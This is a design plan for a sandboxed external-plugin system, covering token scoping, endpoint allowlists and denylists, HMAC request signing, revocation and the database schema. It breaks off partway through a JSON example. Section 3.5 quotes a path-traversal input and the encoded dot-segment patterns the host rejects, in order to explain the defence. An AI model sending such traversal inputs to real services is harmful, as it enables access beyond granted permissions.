# External Plugin System — Plan

External plugins extend the platform with sandboxed JS/TS backend logic and iframe-based
frontends without rebuilding the core app. A **definition** is a `pluginId@version` discovered on
a host; a definition may have multiple **configurations**, each with its own encrypted properties,
granted permissions, and a per-configuration service token. Hosted plugins run as `.wasm` modules
in the plugin host's Extism sandbox. Plugins can run **actions** (synchronous, invoked from a
process service task) and react to **events** (asynchronous, delivered from the core app's event
stream).

Naming: prose says "core app" / "GZAC instance" / "host"; code identifiers keep their literal
names (`gzac`, `valtimo.*` properties, `external_plugin_*` tables, the `external_plugin_service`
token type).

Status legend: ✅ implemented & verified · 🟡 implemented, POC-level · ⛔ not implemented.

## 1. Components

> **Host capabilities** are a per-plugin allowlist of host-side abilities a plugin may use. Every
> host function — including `gzac_api` — requires an explicit grant. A plugin declares the
> capabilities it needs in `manifest.permissions.capabilities`; the admin accepts each one
> individually during configuration. The host enforces the allowlist at call time — a plugin
> that was not granted a capability gets an error response, never silent access.
> Five capability names are declarable: `gzac_api`, `http_request`, `kv`, and `log` are host
> functions; `frontend_data` gates the host's public plugin-data route (§13.5).

| Area | Path | Status |
|------|------|--------|
| Core-app backend module | `backend/external-plugin/` | ✅ |
| Endpoint descriptions (`@EndpointDescription` on every controller method) + contract annotation | `backend/*/.../web/rest/*Resource.{kt,java}`, `com.ritense.valtimo.contract.endpoint.EndpointDescription` | ✅ |
| Plugin host (Node + Fastify + Extism, multi-version) | `plugin-host/app/` | 🟡 |
| Host capabilities (`gzac_api`, `http_request`, `kv`, `log`) — capability allowlist enforcement, host functions, persistent storage (KV + logs), admin log view | `plugin-host/app/src/host-functions/{gzac-api,http-request,kv,log}.ts`, `plugin-host/app/src/db/{log-repository,kv-repository}.ts`, `plugin-host/app/src/routes/plugin-logs.ts` | ✅ |
| Event consumer (RabbitMQ → `handle_event`) | `plugin-host/app/src/rabbitmq/event-consumer.ts` | ✅ |
| Backend plugin SDK (`@valtimo/plugin-sdk`) — actions, events, requests (`handle_request`), `gzacApi` (+ `asUser`), `httpRequest`, `kv`, `log` (structured), frontend `t()` + parent-proxy data access (`callValtimo`/`getPluginData`) | `plugin-host/plugin-sdk/` | ✅ |
| Shared manifest validation (name/description-in-translations), one rule set for pack + host | `plugin-host/plugin-sdk/src/manifest-validation.ts` (subpath `@valtimo/plugin-sdk/manifest-validation`) | ✅ |
| Sample plugin (action + event handler + logo + i18n) | `plugin-host/sample-plugins/case-summary/` | ✅ |
| Frontend management UI + external models/service/iframe | `frontend/projects/valtimo/{plugin-management,plugin}/` | ✅ |
| Process-link (`SERVICE_TASK_START`) — FIXED + BUILDING_BLOCK references, action result write-back | `backend/external-plugin/.../processlink/` + frontend process-link | ✅ |
| Building-block support (shared `PluginConfigurationReference`, namespaced config mappings, required-plugins endpoint, BB-context admin UX) | `backend/external-plugin/.../processlink/ExternalPluginServiceTaskStartListener.kt` + `backend/building-block/.../service/BuildingBlockPluginDefinitionService.kt` ↔ frontend `process-link/.../{select-plugin-configuration,configure-building-block-plugins}` (§19) | ✅ |
| Case-definition import/export parity (preview contributor, mapper remap hook, dangling repair, `EXTERNAL_PLUGIN` case-tab import) | `backend/external-plugin/.../{preview/ExternalPluginImportPreviewContributor,service/ExternalPluginConfigurationMappingResolver}.kt`, `backend/case/.../service/CaseTabImporter.kt` ↔ frontend `case-management/.../{case-management-upload,case-management-missing-plugin-configurations}` (§20) | ✅ |
| Action result write-back (`action_result_mappings` + `result` output channel), embedded **and** external | `backend/plugin/.../service/PluginActionResultHandler.kt` ↔ frontend `process-link/.../plugin-action-result-mappings` (§21) | ✅ |
| Per-host broker / callback config + defaults endpoint | `backend/external-plugin/.../web/rest/ExternalPluginManagementResource.kt#hostDefaults` | ✅ |
| Per-host durable event queue mode + TTL (live/durable, `x-expires`) + narrow PATCH endpoint | `backend/external-plugin/.../domain/EventQueueMode.kt`, `service/ExternalPluginHostService.updateEventQueue`, `web/rest/...#updateHostEventQueue` ↔ `plugin-host/app/src/rabbitmq/event-consumer.ts` | ✅ |
| Plugin assets (logo + i18n bundle in manifest, served by host) | `plugin-host/plugin-sdk/bin/valtimo-plugin-pack.mjs`, `plugin-host/app/src/routes/plugin-bundles.ts` | ✅ |
| GZAC→host auth on **every** route (HMAC-SHA256, replay-protected, body-bound): actions, config-push, management | `client/ExternalPluginHostClient.kt` + `security/ExternalPluginHmacSigner.kt` ↔ `plugin-host/app/src/security/{hmac,hmac-auth}.ts`, `routes/{plugin-actions,host-configurations,host-management}.ts` | ✅ |
| Transport confidentiality (TLS): host serves HTTPS from `TLS_*`; broker credentials confined to a confidential transport at host registration | `plugin-host/app/src/index.ts` (`buildHttpsOptions`) + `models/app-config.ts` ↔ `service/ExternalPluginHostService.isSecureTransport` | ✅ |
| GZAC compatibility check (semver range vs running version): comparator + version provider + zip manifest peek; non-blocking UI warnings, upload confirm-gate | `backend/external-plugin/.../compatibility/*` + `web/rest/ExternalPluginManagementResource.kt#uploadPlugin` ↔ frontend `plugin-management/.../utils/external-plugin-compatibility.util.ts` | ✅ |
| Strict delete guards (embedded + external), shared usage DTO/resolver + `/usages` endpoints + read-only in-use modal, no force override | core `backend/plugin/.../{web/rest/dto/PluginUsageDto, service/ProcessDefinitionUsageMetaResolver, service/PluginConfigurationUsageResolver, exception/PluginConfigurationInUseException}` + `backend/external-plugin/.../{service/ExternalPluginHostUsageResolver, exception/ExternalPlugin*InUseException}` ↔ frontend `plugin-management/.../plugin-usage-modal/` | ✅ |
| Iframe case-detail tab (`EXTERNAL_PLUGIN` tab type, side table, PBAC content endpoint, bundle-resolver SPI) + admin UX | `backend/case/.../case_/{domain/tab/CaseExternalPluginTab, repository/CaseExternalPluginTabRepository, service/CaseExternalPluginTabService, rest/CaseExternalPluginTabResource, service/ExternalPluginCaseTabResolver}` + `backend/external-plugin/.../service/ExternalPluginCaseTabResolverImpl` ↔ frontend `case/.../case-detail/tab/external-plugin`, `case-management/.../tabs` | ✅ |
| Downscoped user token (PBAC ∩ allowlist), non-management mint endpoint, parent-proxy iframe (opaque origin, no token in iframe) | `backend/external-plugin/.../security/ExternalPluginUserToken{KeyProvider,Authenticator,Filter}, security/ExternalPluginUserPrincipal, service/ExternalPluginUserTokenService, web/rest/ExternalPluginUserTokenResource` ↔ frontend `plugin/.../external-plugin-iframe`, SDK `frontend/plugin-frontend-sdk.ts` (proxy bridge) | ✅ |
| Plugin-served data route (`handle_request` Wasm export + host `POST .../data`, gated on the granted `frontend_data` capability + per-config rate limit + a required, GZAC-introspected, configuration-bound user token) + backend-as-user (`gzacApi.asUser`) | `plugin-host/plugin-sdk/src/{requests.ts,runtime.ts,gzac-api.ts}`, `plugin-host/app/src/{routes/plugin-data.ts,security/user-token-introspection.ts,host-functions/gzac-api.ts,plugin-manager.ts#callRequest}` ↔ `backend/external-plugin/.../web/rest/ExternalPluginUserTokenIntrospectionResource.kt` | ✅ |

Single-core-app model with **multiple hosts per instance**: the core app pushes each configuration
directly to its host with a freshly issued service token, a `gzacBaseUrl` callback target taken
from the host row, and an optional `eventBroker` block also taken from the host row. Definitions
are discovered by polling each host (`GET /api/host/plugins`, default 60s) and stored with
`UNIQUE(plugin_id, version)`.

## 2. Zero-configuration deployment

The external-plugin module ships with **no additional `application.yml` entries** beyond what the
rest of Valtimo already requires. Every value the module needs is either:

- **Per-host**, entered once in the add-host UI (host base URL, admin token, callback URL,
  optional broker URL/exchange) and stored on the host row, **or**
- **Derived from existing platform config** at runtime (the JWT signing key, the broker exchange
  fallback, the legacy callback fallback).

| What the module needs | Where it comes from | When |
|----------------------|---------------------|------|
| JWT signing keys | `SHA-256(valtimo.plugin.encryption-secret + "\|service")` for service tokens, `SHA-256(… + "\|user")` for user tokens | At every JWT issue/verify. The hash gives a stable 32-byte HmacSHA256 key regardless of the encryption secret's raw length, so AES-128 (16-byte) and AES-256 (32-byte) deployments both work without reconfiguration; hashing also keeps the signing keys cryptographically separate from the AES key. The domain suffix gives each token kind its **own** key, so a token of one kind can never validate against the other kind's parser (§3.2, §13.3). |
| Host HTTP timeouts | `valtimo.external-plugin.connect-timeout` / `read-timeout` (Spring durations, defaults 2 s / 10 s) | Applied to the shared `RestTemplate` every GZAC→host call uses, so an unreachable or slow host fails fast instead of pinning request threads. |
| `gzacBaseUrl` per push | `external_plugin_host.gzac_callback_base_url` | Set in the add-host UI; default pre-fill is `http://localhost:{server.port}` because the admin's browser URL (often the Angular dev proxy at `:4200` or a reverse proxy in production) is not a reliable signal for the URL plugin hosts should call back on. |
| Broker AMQP URL per push | `external_plugin_host.event_broker_amqp_url` (nullable) | Set in the add-host UI; default pre-fill built from `spring.rabbitmq.*`. Null disables events for hosts under this host (actions still work). A non-null broker URL requires the host base URL to be a confidential transport (HTTPS, or a loopback address for local dev); registration is rejected otherwise so AMQP credentials never travel over plaintext (§3.9). |
| Broker exchange per push | `external_plugin_host.event_broker_exchange`, else `valtimo.outbox.publisher.rabbitmq.exchange` | Set in the add-host UI; default pre-fill from the outbox exchange, which is what GZAC itself publishes to. |
| Broker exchange type | hardcoded `fanout` | Matches the outbox publisher and the exchange declared in `imports/gzac-rabbitmq/definitions.json`. |
| Queue mode per push (`live`/`durable`) | `external_plugin_host.event_queue_mode` (default `LIVE`) | Set in the add-host UI and editable later via `PATCH .../host/{id}/event-queue` (§8.4). Drives the host's `assertQueue` arguments. |
| Queue inactivity TTL per push (ms) | `external_plugin_host.event_queue_ttl_ms` (nullable; required when mode is `DURABLE`) | Validated to `[1h, 30d]`, default 72h. Maps to RabbitMQ `x-expires`; ignored (forced null) in `LIVE` mode. |

The module requires **no entries** in `backend/app/gzac/src/main/resources/application.yml`.

## 3. Endpoint-scoped service token & permission enforcement ✅

A plugin gets a token scoped to exactly the API endpoints its configuration was granted, enforced
per-request with deny-by-default. The same token authenticates both action callbacks and event
callbacks.

**3.1 Activation stores grants (`service/ExternalPluginConfigurationService.kt`)**
- `create()` validates properties against the definition JSON schema, then
  `validateGrantedEndpointsCoverManifest()` **rejects the configuration unless the granted
  endpoints exactly match the manifest's declared set** (`requireExactGrantMatch`): every declared
  endpoint must be granted — the admin explicitly acknowledges the plugin's full footprint — and
  nothing beyond the declaration can be granted (a grant the plugin never asked for is always a
  mistake). A manifest without a declaration section requires an empty grant set — nothing may be
  granted.
- `create()` likewise runs `validateGrantedEventsCoverManifest()` — the same exact-match gate
  applied to `manifest.eventSubscriptions`. `create()` also runs
  `validateGrantedCapabilitiesCoverManifest()` — the same exact-match gate applied to
  `manifest.permissions.capabilities`; capability names are additionally parsed into the
  `ExternalPluginCapability` enum **before anything is persisted**, so an unknown capability name
  is rejected up front. All three — `grantedEndpoints`, `grantedEvents`, and
  `grantedCapabilities` — are parameters of `create()`; all three are enforced at
  the service layer, not only in the UX (§4).
- Grants persist to `external_plugin_granted_endpoint` (`configuration_id`, `http_method`,
  `endpoint_pattern`), `external_plugin_granted_event` (`configuration_id`, `event_type`), and
  `external_plugin_granted_capability` (`configuration_id`, `capability`);
  `update()` with non-null `grantedEndpoints` replaces the endpoint grants, null leaves them
  unchanged. `update()` has **no** `grantedEvents` or `grantedCapabilities` parameter — event
  and capability grants cannot change through the edit flow after activation; the one path that
  resets them is an admin-confirmed version overwrite, which re-grants every configuration to
  exactly the newly declared sets after the admin re-reviewed them (§11). Granted capabilities
  are pushed to the host alongside the configuration (§18.3) so the host can enforce the
  allowlist at call time.

**3.2 Token (`service/ExternalPluginServiceTokenService.kt`)** — HS256 JWT:
`sub=external-plugin:{pluginId}:{configId}`, `type=external_plugin_service`, `plugin_config_id`,
`plugin_id`, `plugin_version`, `token_generation` (the configuration's revocation counter —
§3.6), `iss=valtimo-gzac`, `exp=now+ttl`. **No roles claim** — the authenticator attaches fixed
`ROLE_ADMIN` + `ROLE_USER` authorities at authentication time instead (§3.3). Signed with
`SHA-256(valtimo.plugin.encryption-secret + "|service")` — the shared
`security/ExternalPluginTokenKeyProvider.kt` base derives a **domain-separated** key per token
kind (`|service` here, `|user` for the iframe token, §13.3), so a token of one kind can never
validate against the other kind's parser — the `type` claim is a routing hint, not the security
boundary. See `security/ExternalPluginServiceTokenKeyProvider.kt`.
The lifetime `ttl` is the `valtimo.external-plugin.service-token.ttl` property — a Spring duration
(ISO-8601 `PT10M` or the `10m` shorthand), defaulting to **10 minutes** — parsed in the
autoconfiguration (`DurationStyle.detectAndParse`) and handed to the service; the service itself
falls back to 10 minutes when constructed without one. The short default costs nothing because the
discovery poll (default 60s) re-pushes a fresh token every cycle (§3.6); it only caps how long a
*leaked* token stays usable.

**3.3 Recognition (`security/ExternalPluginServiceTokenFilter.kt`)** — registered **before**
`BearerTokenAuthenticationFilter` (`security/ExternalPluginCallbackHttpSecurityConfigurer.kt`,
`@Order(450)`): parses the bearer JWT with the service-token signing key; passes through if
signature or `type` claim don't match (Keycloak tokens untouched); on match the authenticator
first checks the token's `token_generation` claim against the configuration's current counter
(§3.6) — a mismatch, a missing claim, or a configuration that no longer exists rejects the token —
then sets an `ExternalPluginServicePrincipal` carrying fixed `ROLE_ADMIN` + `ROLE_USER`
authorities, **strips the `Authorization` header**, and runs the rest of the chain inside
`AuthorizationContext.runWithoutAuthorization` (PBAC is intentionally bypassed for service tokens —
the allowlist is the sole gate). The authorities are not trust in the plugin: Spring Security's
`AuthorizationFilter` applies the platform's coarse per-URL rules (`.authenticated()` /
`hasAuthority(…)`) at the *end* of the chain, after the allowlist filter (§3.4) has already 403'd
anything outside the granted set. Without them, every `hasAuthority`-gated endpoint — all of
`/api/management/**` — would 403 even when explicitly granted; with them, reach is still exactly
grants ∖ denylist (`ExternalPluginServiceTokenAccessIntTest` pins both directions through the full
chain). The service- and user-token filters share the
`AbstractExternalPluginTokenFilter` base, and all three plugin filters are excluded from servlet
auto-registration (disabled `FilterRegistrationBean`s in the autoconfiguration) so they run only
inside the Spring Security chain, never a second time as bare servlet filters.

**3.4 Enforcement (`security/ExternalPluginEndpointAllowlistFilter.kt`)** — registered **after**
`BearerTokenAuthenticationFilter`:
1. Principal not `ExternalPluginServicePrincipal` (or `ExternalPluginUserPrincipal`, §13.3) → pass
   through (users and existing plugins unaffected).
2. **Hard denylist** (`DENYLIST_PATTERNS`) → 403 **regardless of what was granted**: plugin tokens
   can never reach `/api/management/v1/external-plugin/**` and `/api/v1/external-plugin/**`
   (external-plugin management incl. host registration, plus user-token minting — a plugin must
   not mint tokens for arbitrary users) or `/api/management/v1/roles/**` and
   `/api/management/v1/permissions/**` (role/permission management — privilege escalation), nor
   issue non-`GET` requests to `/api/v1/users/**` (`DENYLIST_METHOD_PATTERNS` — user-account
   mutations: a plugin that can create or alter accounts can escalate to a real admin login, and
   with the ADMIN authority on the service principal (§3.3) this denylist is the only guard
   between a grant and these surfaces; user *reads* like `GET /api/v1/users/{userId}` stay
   grantable). One
   narrow carve-out precedes the denylist: a **user**-token principal may always `GET
   /api/v1/external-plugin/user-token/introspect` (exact path, GET only — the plugin host must be
   able to introspect the token before serving `/data`, §13.5; the endpoint is read-only and
   returns nothing beyond the token's own claims). Service-token principals get no carve-out.
3. Load grants for `plugin_config_id`, match request via `AntPathRequestMatcher(pattern, method)`;
   no match → 403; empty grants → deny. The compiled matchers are cached per configuration id for
   a short TTL (30 s) so the per-request cost is a map lookup instead of a DB query; an invalid
   stored pattern is skipped with a warning (deny unless another grant matches) rather than
   failing the request with a 500.

**3.5 Host callback** — the host's `gzac_api` host function
(`plugin-host/app/src/host-functions/gzac-api.ts`) attaches the per-config `serviceToken` as
`Authorization: Bearer` to `${gzacBaseUrl}${path}`, forwarding method, JSON body, and headers. The
token is passed via Extism `hostContext`, never serialised into the Wasm input — plugin code never
sees it. This is the same mechanism for both action handlers and event handlers. `gzac_api` is a
**capability** (§18) — the configuration must be granted `gzac_api` in its capability allowlist
or the host function returns a capability-denied error without making the upstream call. The host
additionally enforces the configuration's **granted-endpoint allowlist on its own side**
(`security/endpoint-allowlist.ts`, Ant-style patterns): a call outside the granted set is refused
with a 403-shaped reply before anything leaves the host — GZAC's servlet filter (§3.4) remains
the authoritative gate; a configuration whose push carried no endpoint list is allowed with a
warning (§8.2). A plugin-supplied `Authorization` header is **stripped** (and logged) and the
host-controlled credential is attached last, so a plugin can never substitute its own token. The
plugin-supplied path is **canonicalised once** (`security/request-path.ts`) and that single
canonical value is what the allowlist is checked against, what is requested, and what the audit log
records: `fetch` resolves dot segments while parsing the URL, so checking the raw string would let
`/api/v1/document/../../../v1/case/1` match a grant on `/api/v1/document/**` and then request
something else entirely. Percent-encoded separators and dot segments (`%2e`, `%2f`, `%5c`) are
refused rather than decoded, as is a path that would escape the API root. The callback fetch is
bounded by an `AbortSignal` timeout (`GZAC_API_TIMEOUT_MS`, default 60 s — reported as a 504-shaped
reply, with a 502-shaped reply for a failed fetch), so a hung GZAC endpoint cannot pin the plugin
call and the pooled instance it holds indefinitely.

**3.6 Token lifecycle** — operator-tunable TTL (`valtimo.external-plugin.service-token.ttl`,
default 10m, §3.2), **no separate refresh loop**. Each healthy discovery poll re-pushes every
configuration with a freshly issued token
(`service/ExternalPluginDiscoveryService.syncConfigurations()`), continuously replacing tokens
well inside their lifetime. That poll *is* the refresh mechanism (default 60s,
`valtimo.external-plugin.polling.rate`), so a tuned TTL must stay comfortably above the poll
interval or a token can lapse between pushes. The polling job (`service/ExternalPluginDiscoveryJob.kt`)
runs under ShedLock (`@SchedulerLock`, `lockAtLeastFor` 10 s / `lockAtMostFor` 10 min), so in a
multi-replica deployment exactly one instance polls per tick instead of every replica hammering
the same hosts. Discovery keeps a strict transaction discipline: all host HTTP I/O (health probe,
plugin listing, config re-pushes) runs **outside** any database transaction, with the bookkeeping
writes in short per-host transactions (`TransactionTemplate`) — a slow or hanging host never pins
a database connection, and one host's failure never rolls back another host's bookkeeping.

**Revocation.** Every configuration carries a revocation counter
(`external_plugin_configuration.token_generation`); every token minted for it — service (§3.2)
*and* user (§13.3) — is stamped with that counter as its `token_generation` claim, and both token
authenticators accept a token only while its claim equals the configuration's current value (a
missing claim or a deleted configuration also rejects). `POST
/api/management/v1/external-plugin/configuration/{id}/revoke-tokens` (ADMIN) bumps the counter and
immediately re-pushes the configuration, handing the host a fresh token of the new generation: a
leaked or hoarded token dies on its next use while a legitimate host keeps working without waiting
for the next poll. Because the host's user-token introspection route authenticates with the token
under introspection (§13.3), a revoked user token also stops validating for the host's `/data`
path. Deleting the configuration is the other, heavier kill switch (§12).

**3.7 Caveat** — service tokens bypass PBAC, so the allowlist is the entire authorization surface;
an over-broad grant (`/api/v1/**`) gives broad role-free access. Hence the activation-time
acceptance screen (§4) is security-critical.

**3.8 Manifest field naming.** The endpoint allowlist lives at `permissions.endpoints` in the
manifest. The same declaration is the source of truth for both the service-token allowlist (this
section) and the iframe user-token path (§13, ✅) — one block, **two principals** through one
`ExternalPluginEndpointAllowlistFilter` (`ExternalPluginServicePrincipal` and
`ExternalPluginUserPrincipal`). SDK type `Endpoint`, Kotlin DTO `GrantedEndpointEntry`, frontend type
`ExternalPluginEndpoint`. The capability allowlist lives at `permissions.capabilities` in the
manifest — a string array of capability names (any of `gzac_api`, `http_request`, `kv`, `log`,
`frontend_data`).
SDK type `string[]`, Kotlin `List<String>`, frontend `string[]`. See §18 for the full capability
system.

**3.9 Reverse direction — GZAC→host authentication (HMAC), every route ✅.** Calls that flow the
*other* way (core app → host) are authenticated with an HMAC-SHA256 signature, not the service
token. Every GZAC→host route is covered: action invocations, config-push, and host management. The
client signs `{METHOD}\n{path}\n{timestamp}\n{bodyHash}` (`bodyHash = SHA-256(body)` hex,
`timestamp = Instant.now()` ISO-8601) with the host's **decrypted secret**
(`security/ExternalPluginHmacSigner`), and sends `X-Valtimo-Signature` + `X-Valtimo-Timestamp`. The
HMAC key is therefore the host's admin token (`hostService.decryptedSecret(host)` == the host's
`ADMIN_TOKEN`); the secret is always carried as a signature, never as a bearer token.
`client/ExternalPluginHostClient` signs through one `hmacHeaders(secret, method, path, body)` helper
for every call (`invokeAction`, `invokeSubmit`, `pushConfiguration`, `deleteConfiguration`,
`listPlugins`, `uploadPlugin`, `getConfigurationLogs`).

The host verifies in a shared Fastify `preHandler` (`createHmacAuthHook`,
`plugin-host/app/src/security/hmac-auth.ts`, delegating to `security/hmac.ts`): headers present,
±5-min timestamp window, timing-safe compare against `computeSignature(ADMIN_TOKEN, …)`. On top of
the timestamp window, a process-wide **seen-signature replay cache** (`security/replay-cache.ts`)
records every accepted signature and rejects a duplicate on side-effecting methods
(POST/PUT/DELETE/PATCH) — closing the replay gap the ±5-min drift window would otherwise leave
open; the signature binds method+path+timestamp+bodyHash, so any legitimate new request differs in
at least the timestamp. The cache is shared by every HMAC-authenticated route, so a signature
accepted by one route can never be replayed against another. The hook is the action route's
`preHandler` and a plugin-level `preHandler` on both `routes/host-configurations.ts` and
`routes/host-management.ts`.

**Body binding per route shape:**
- **JSON-body routes** (action POST; config-push POST/PUT) opt in to raw-body capture
  (`config: { rawBody: true }` + `fastify-raw-body`) and bind the exact request bytes. The
  config-push body carries the freshly issued service token and broker credentials — binding it is
  what stops a replayed/forged push from installing a swapped token or broker.
- **No-body routes** (config GET/DELETE; management GET/DELETE) bind an empty body
  (`SHA-256("")`), so method + path + timestamp are still signed.
- **Multipart upload** (`POST /api/host/plugins`) cannot bind the multipart envelope — RestTemplate
  generates the boundary internally, so the client cannot reproduce the wire bytes to hash. Instead
  both sides hash the **uploaded file bytes** (the `.zip`). The route is flagged
  `config: { deferHmac: true }` so the shared hook skips it, and the handler runs
  `verifyDeferredHmac(...)` once it has read the file into a buffer.

- **Caveat 1 (path prefix):** the signed `path` is the bare route path (`/plugins/...`,
  `/api/host/...`); the host verifies `request.url` minus the query string. A reverse proxy that
  prepends a path prefix the host sees in `request.url` would break verification. Root-mounted hosts
  (the default) are unaffected.
- **Caveat 2 (encryption is the transport's job, not HMAC's):** HMAC authenticates and
  integrity-binds every request but does not encrypt it, so confidentiality of the service token and
  broker credentials in a config-push body rides on the transport. Two mechanisms keep those secrets
  off an eavesdroppable link:
  - The host serves **HTTPS** when `TLS_CERT_PATH` + `TLS_KEY_PATH` are set (`buildHttpsOptions` in
    `plugin-host/app/src/index.ts`; optional `TLS_CA_PATH` for a chain; both cert and key required or
    the host refuses to start), encrypting the GZAC→host channel end-to-end.
  - Host registration **refuses a non-null `eventBrokerAmqpUrl` unless the host base URL is a
    confidential transport** — HTTPS, or a loopback address (`localhost`/`127.0.0.1`/`::1`) for local
    development (`ExternalPluginHostService.isSecureTransport`). Registration is the single gate
    because the base URL is immutable afterwards, so no later push can reach an insecure host with
    broker credentials.

  Hosts without a broker (actions only) may still run over plain HTTP — e.g. behind a TLS-terminating
  reverse proxy. Replay and forgery are closed by the HMAC scheme; eavesdropping is closed by running
  the broker-carrying channel over TLS.

## 4. Permission UX ✅

Components: `plugin-management/.../{plugin-external-permissions, plugin-add-modal,
plugin-external-edit-modal, plugin-external-configure}`. Endpoint descriptions are localised via
`POST /api/management/v1/external-plugin/endpoint-descriptions`. Each endpoint declares its own
English and Dutch text directly on the controller handler method with an `@EndpointDescription(en,
nl)` annotation (`com.ritense.valtimo.contract.endpoint.EndpointDescription`);
`EndpointDescriptionService` collects every annotation from Spring's `RequestMappingHandlerMapping`
and resolves a queried pattern against them (glob and `{param}` matching, `en`/`nl` with `en`
fallback). A test (`EndpointDescriptionCoverageTest`, `backend/external-plugin`) enforces that
**every** controller endpoint on the classpath — not only management ones — carries both
translations, so the description requirement cannot drift as endpoints are added.

The Permissions step shows three read-only sections under a single acknowledgement checkbox:

- **Host capabilities** — every entry from `manifest.permissions.capabilities` (`gzac_api`,
  `http_request`, `kv`, `log`, `frontend_data`). Each capability is shown with a localised name and description
  explaining what it grants the plugin (e.g. "GZAC API — Make authenticated calls to the GZAC
  REST API on behalf of the plugin or the logged-in user"). Capabilities are displayed first
  because they represent the broadest grants.
- **API endpoints** — every entry from `manifest.permissions.endpoints` with method, pattern, and
  localised description. Only relevant when `gzac_api` is among the declared capabilities;
  otherwise this section is hidden.
- **Events** — every CloudEvent type from `manifest.eventSubscriptions` that the plugin will
  receive at `handle_event`.

All three are equally a permission decision: granting capabilities lets the plugin call host
functions; granting endpoints scopes *which* GZAC endpoints the `gzac_api` capability can reach;
granting events lets it observe domain activity. The single acknowledgement covers all three — each
granted set must **exactly match** the manifest's declared set: the backend rejects activation when
any declared item is missing from the grants *and* when a grant names anything the manifest does
not declare (§3.1).

- **Add / activate**: select → configure (properties or config iframe) → **Permissions**. Save →
  `POST .../configuration` `{definitionId, title, properties, grantedEndpoints, grantedEvents,
  grantedCapabilities}`.
- **Edit**: same component with `[readonlyMode]="true"`; the UI update sends `{title, properties}`
  only. Granted **events** and **capabilities** cannot change through the edit flow (service-layer
  `update()` has no `grantedEvents` or `grantedCapabilities` parameter); the one path that resets
  them is the admin-confirmed version overwrite, which re-grants to the newly reviewed declared
  sets (§11). Granted **endpoints** are immutable *in the UI*, but the backend `update()` will
  replace them if a non-null `grantedEndpoints` is supplied (§3.1) — the immutability of endpoint
  grants is a UI guarantee, not a service-layer one.

## 5. Data model ✅

Tables (host secret and config properties stored encrypted via the existing `EncryptionService`).
DDL lives in the **core** module's changelog, not the external-plugin module's own resources:
`backend/core/src/main/resources/config/liquibase/13-28-0/20260504-external-plugin.xml`.

- `external_plugin_host` — `base_url`, encrypted `secret`, `status`, health/failure counters,
  **plus** `gzac_callback_base_url`, `event_broker_amqp_url`, `event_broker_exchange` (all
  populated from the add-host UI; the two broker columns nullable for events-off / use-default-exchange),
  **plus** `event_queue_mode` (`LIVE`/`DURABLE`, default `LIVE`, added in
  `20260617-external-plugin-event-queue.xml`) and `event_queue_ttl_ms` (nullable bigint; required
  when mode is `DURABLE`, ignored when `LIVE`), **plus** `frontend_origins` (nullable varchar,
  changeset `13-32-0/20260812-external-plugin-frontend-origins.xml`): the comma-separated browser
  origins allowed to embed this host's plugin screens, pushed to the host as its `frame-ancestors`
  allowlist (§7). Deliberately *not* derived from `gzac_callback_base_url` — that is a
  server-to-server URL and routinely a different address than the admin's browser uses. NULL (legacy
  rows) means nothing may frame that host's plugins until an admin fills it in.
- `external_plugin_definition` — `UNIQUE(plugin_id, version)`, `config_schema`, `manifest_json`,
  `host_id`, `base_url`, `status`, plus `name`, `description`, `provider`, `min_gzac_version` /
  `max_gzac_version` (populated at discovery from the manifest's `compatibility` block, compared
  against the running GZAC version to surface a non-blocking compatibility warning — §11),
  `consecutive_misses`, **plus** `content_hash` / `pending_content_hash` (changeset
  `13-32-0/20260806-external-plugin-security-hardening.xml`): the package content hash pinned at
  discovery, and — when the host serves different bytes under the same `pluginId@version` — the
  hash it serves instead, which flags the definition for admin re-acceptance (§11). The
  manifest's declared `eventSubscriptions` live here (inside
  `manifest_json`), discovered from the host — but the authoritative subscription list for any
  given activated configuration is `external_plugin_granted_event` (next paragraph), not the
  manifest copy.
- `external_plugin_configuration` — `definition_id`, `title`, `properties` (encrypted on schema
  `x-secret` fields), `created_at`, and `token_generation` (bigint, the revocation counter every
  minted token is validated against — §3.6). API responses never carry secret values:
  `GET .../configuration/{id}` returns **masked** properties with the `x-secret` fields omitted
  entirely (mirroring the embedded module's `PluginConfigurationDto`), and an update whose payload
  leaves a secret field absent or blank means "unchanged" — the stored ciphertext is kept and the
  stored plaintext is substituted server-side for schema validation, so a round-tripped masked
  payload never overwrites a secret. Decrypted properties exist server-side only, for the host
  push.
- `external_plugin_granted_event` — `configuration_id`, `event_type`, `granted_at`;
  `UNIQUE(configuration_id, event_type)`. Pushed to the host on every config push as the actual
  subscription set. A later manifest update that adds a new event type cannot widen this set — the
  row only changes when the admin re-grants.
- `external_plugin_granted_endpoint` — `configuration_id`, `http_method`, `endpoint_pattern`,
  `granted_at`; `UNIQUE(configuration_id, http_method, endpoint_pattern)`.
- `external_plugin_granted_capability` — `configuration_id`, `capability` (varchar, e.g.
  `gzac_api`, `http_request`, `kv`, `log`, `frontend_data`), `granted_at`;
  `UNIQUE(configuration_id, capability)`. Pushed to the host on every config push as the
  authoritative capability set (§18.3). A later manifest update that adds a new capability cannot
  widen this set — the admin must re-grant.
- Each grant table enforces a DB unique constraint on its `(configuration_id, …)` natural key, so
  duplicate grant rows are structurally impossible. The replace-on-write `update()` flow deletes a
  configuration's endpoint grants and flushes that delete before re-inserting, so a replacement set
  that overlaps the previous grants stays within the constraint.
- `external_plugin_*` columns on `process_link` for the `SERVICE_TASK_START` action link:
  `external_plugin_config_id` (nullable — null for `BUILDING_BLOCK` references and dangling
  imports), `external_plugin_action_key`, `external_plugin_action_properties`. The plugin identity
  and version live on the **shared** reference columns `reference_type` / `plugin_definition_key`
  (= `pluginId`) / `plugin_definition_version` — the same `PluginConfigurationReference` embeddable
  the embedded `PluginProcessLink` maps; embedded rows keep `plugin_definition_version` null
  (embedded definitions are unversioned). The reference version is design-time metadata only —
  the runtime invocation version always derives from the resolved configuration's definition
  (§19). `action_result_mappings` (json, also shared with the embedded link type) holds the
  action's result write-back rules (§21). The task-form link's version likewise lives on the
  shared reference columns; its own columns are `external_plugin_task_form_{config_id,bundle_key}`.

Events add **no new table**: subscriptions come from `manifest_json`, the broker connection
details come from the host row, and at push time they are pushed transiently to the host (held
only in the host's in-memory registry until the host stores them in its own PostgreSQL).

## 6. Adding a host & host-defaults endpoint ✅

`GET /api/management/v1/external-plugin/host-defaults` (`ExternalPluginManagementResource`)
returns pre-fills the add-host UI uses to populate the new-host form:

```json
{
  "gzacCallbackBaseUrl": "http://localhost:8080",
  "eventBrokerAmqpUrl": "amqp://***@localhost:5672",
  "eventBrokerExchange": "valtimo-events",
  "defaultEventQueueTtlMs": 259200000,
  "minEventQueueTtlMs": 3600000,
  "maxEventQueueTtlMs": 2592000000,
